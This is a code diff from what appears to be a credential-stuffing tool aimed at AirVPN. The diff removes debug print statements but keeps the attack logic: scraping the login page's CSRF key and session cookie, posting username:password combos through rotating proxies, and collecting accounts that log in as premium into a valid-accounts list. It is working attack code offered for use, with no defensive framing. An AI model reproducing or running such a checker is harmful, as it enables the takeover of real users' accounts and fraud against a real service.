@@ -35,11 +35,8 @@ def check(x):
                 continue
             if len(re.findall(re_csrfKey, r_one.text)) != 1:
                 continue
-            print(re.findall(re_csrfKey, r_one.text)[0])
             csrfKey = re.findall(re_csrfKey, r_one.text)[0]
-            print(r_one.cookies)
             cookie_ips4_IPSSessionFront = {'ips4_IPSSessionFront': requests.utils.dict_from_cookiejar(r_one.cookies)['ips4_IPSSessionFront']}
-            print(cookie_ips4_IPSSessionFront)
             login(combo=combo, cookie=cookie_ips4_IPSSessionFront, csrfKey=csrfKey, proxs_list=proxs_list)
             return
         except:
@@ -56,7 +53,6 @@ def login(combo, cookie, csrfKey, proxs_list):
     for x in range(0, int(settings.airvpn.max_errors_per_try2)):
         try:
             r_two = requests.post(url="https://airvpn.org/login/", data=body, headers=header, cookies=cookie, timeout=settings.airvpn.timeout, proxies=proxs_list[1])
-            print(x)
             if len(re.findall(re_goodresponse, r_two.text)) == 0:
                 # repeat the requests cause it was a bad request
                 proxs_list = proxy_getter(__name__)
@@ -69,7 +65,6 @@ def login(combo, cookie, csrfKey, proxs_list):
                 accounts.valid_airvpn.append(f"{username}:{password}:Premium")
                 return
             else:
-                print("Non premium")
                 break
         except:
             continue
